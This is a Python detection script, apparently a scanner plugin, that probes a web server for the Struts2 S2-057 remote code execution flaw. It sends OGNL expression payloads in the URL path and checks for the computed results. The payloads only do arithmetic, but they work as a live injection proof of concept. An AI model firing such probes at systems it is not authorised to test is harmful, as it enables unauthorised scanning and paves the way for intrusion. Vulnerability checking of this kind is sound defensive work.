import requests
import re
import urllib


def verify(url):
    relsult = {
        'name': 'S2-057 远程代码执行漏洞',
        'vulnerable': False
    }
    try:
        vurl1 = urllib.parse.urljoin(url, '$%7B9437*2453%7D/actionChain1.action')
        vurl2 = urllib.parse.urljoin(url, '$%7B233*233%7D/actionChain1.action')
        req1 = requests.get(vurl1, timeout=3)
        req2 = requests.get(vurl2, timeout=3)
        if re.search('23148961', req1.text) and re.search('54289', req2.text):
            relsult['vulnerable'] = True
            relsult['method'] = 'GET'
            relsult['url'] = url
            relsult['payload'] = vurl1
            relsult['about'] = 'https://github.com/vulhub/vulhub/tree/master/struts2/s2-057'
        return relsult
    except:
        return relsult



